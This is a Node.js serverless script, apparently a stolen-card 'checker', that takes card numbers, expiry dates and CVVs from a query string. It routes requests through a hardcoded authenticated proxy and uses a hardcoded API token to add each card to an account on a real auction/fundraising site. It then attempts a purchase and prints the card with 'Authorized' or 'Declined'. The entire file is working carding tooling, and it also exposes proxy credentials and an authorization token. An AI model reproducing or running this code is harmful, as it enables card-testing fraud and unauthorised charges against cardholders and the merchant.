const axios = require('axios');
const { URL } = require('url');

const DEFAULT_PROXY = {
  host: '31.59.20.176',
  port: 6754,
  protocol: 'http',
  auth: {
    username: 'cfstgxzz',
    password: 'spt0ttz22rxi'
  }
};

const HEADERS = {
  'Host': 'api.winwithdash.com',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0',
  'Accept': 'application/json, text/plain, */*',
  'Accept-Language': 'fr,fr-FR;q=0.9,en-US;q=0.8,en;q=0.7',
  'Authorization': '-ydSvuB1UnbRWJeIPFle63PvkjZb2ZkxAlNqnyHXjMoU1ptcrDYp5CKr2BXIhPgn',
  'Content-Type': 'application/json',
  'Origin': 'https://fans.winwithdash.com',
  'Referer': 'https://fans.winwithdash.com/',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'same-site'
};

function parseProxy(proxyInput) {
  if (!proxyInput) return DEFAULT_PROXY;

  let raw = proxyInput.trim();
  if (!raw) return DEFAULT_PROXY;
  if (!raw.includes('://')) raw = `http://${raw}`;

  try {
    const proxyUrl = new URL(raw);
    const proxy = {
      host: proxyUrl.hostname,
      port: parseInt(proxyUrl.port || (proxyUrl.protocol === 'https:' ? '443' : '80'), 10),
      protocol: proxyUrl.protocol.replace(':', '')
    };

    if (proxyUrl.username) {
      proxy.auth = {
        username: decodeURIComponent(proxyUrl.username),
        password: decodeURIComponent(proxyUrl.password)
      };
    }

    return proxy;
  } catch (error) {
    return DEFAULT_PROXY;
  }
}

function parseCardData(lista) {
  const parts = lista.replace(/[:|]/g, ',').split(',').map(item => item.trim());
  return {
    cc: parts[0] || '',
    mes: String(parts[1] || '').padStart(2, '0'),
    ano: (parts[2] || '').length === 2 ? `20${parts[2]}` : parts[2] || '',
    cvv: parts[3] || ''
  };
}

function getMessageFromResult(resultString) {
  if (resultString.includes('refusé par la banque')) return 'Bank Refused';
  if (resultString.includes('données invalides')) return 'Invalid Data Params';
  if (resultString.includes('Internal Server Error')) return 'Hard Declined (DEAD)';

  const match = resultString.match(/"message":"([^"]+)"/);
  if (match && match[1]) return match[1];

  return 'Declined/Error';
}

async function sendRequest(url, payload, proxy) {
  return axios.post(url, payload, {
    headers: HEADERS,
    proxy,
    timeout: 30000
  });
}

module.exports = async (req, res) => {
  if (req.method !== 'GET') {
    return res.status(405).send('Method Not Allowed');
  }

  const lista = String(req.query.lista || '').trim();
  if (!lista) {
    return res.status(400).send('Missing lista parameter.');
  }

  const proxy = parseProxy(req.query.proxy);
  const card = parseCardData(lista);

  if (!card.cc || !card.mes || !card.ano || !card.cvv) {
    return res.status(400).send('Invalid card format. Use CARD|MM|YY|CVV');
  }

  const addCardUrl = 'https://api.winwithdash.com/v4/users/69e052935f3a5600073865c4/add-card';
  const purchaseUrl = 'https://api.winwithdash.com/v4/auction-items/69dd4a720713a10007f15675/purchase';

  const addCardPayload = {
    currency: 'USD',
    cvv: card.cvv,
    number: card.cc,
    zipCode: '10004',
    exp_month: card.mes,
    exp_year: card.ano,
    foundationId: '668f12897f45720008a3e97e'
  };

  try {
    const addCardResponse = await sendRequest(addCardUrl, addCardPayload, proxy);
    const addCardData = addCardResponse.data;
    const addCardString = typeof addCardData === 'string' ? addCardData : JSON.stringify(addCardData);

    let cardId = addCardData?.cardId || '';
    if (!cardId) {
      const cardMatch = addCardString.match(/"cardId":"([^"]+)"/);
      cardId = cardMatch ? cardMatch[1] : '';
    }

    let finalResultString = addCardString;

    if (cardId && addCardString.includes('{"brand":"')) {
      const purchasePayload = {
        purchaseCount: 1,
        payWithCardId: cardId,
        payWithCustomerId: '',
        fulfillmentOption: {
          id: '674279df1b610e0008be8e23',
          createdAt: '2024-11-24T00:57:03.617Z',
          updatedAt: '2026-03-17T18:23:26.685Z',
          name: 'Bison Ticket Office',
          type: 'pickup',
          description: 'With this option, you can pick up your item anytime from 9 AM to 5 PM at our Ticketing Office, located at 318 W Washington Street, Suite 1A.',
          sequence: -1,
          foundationId: '668f12897f45720008a3e97e'
        }
      };

      const purchaseResponse = await sendRequest(purchaseUrl, purchasePayload, proxy);
      const purchaseData = purchaseResponse.data;
      finalResultString = typeof purchaseData === 'string' ? purchaseData : JSON.stringify(purchaseData);
    }

    res.setHeader('Content-Type', 'text/html; charset=utf-8');

    if (finalResultString.includes('"total"') || finalResultString.includes('"Total"')) {
      return res.send(`<font size=4 color='green'>#Authorized ✅ ${card.cc}|${card.mes}|${card.ano}|${card.cvv} </font><font size=2 color='green'>[WORLDPAY 15$]</font><br>`);
    }

    const message = getMessageFromResult(finalResultString);
    return res.send(`<font size=4 color='red'>#Declined! ❌ ${card.cc}|${card.mes}|${card.ano}|${card.cvv} | Reason: ${message}</font><br>`);
  } catch (error) {
    const errorDetail = error.response?.data ? JSON.stringify(error.response.data) : error.message;
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    return res.status(500).send(`API error: ${errorDetail}`);
  }
};
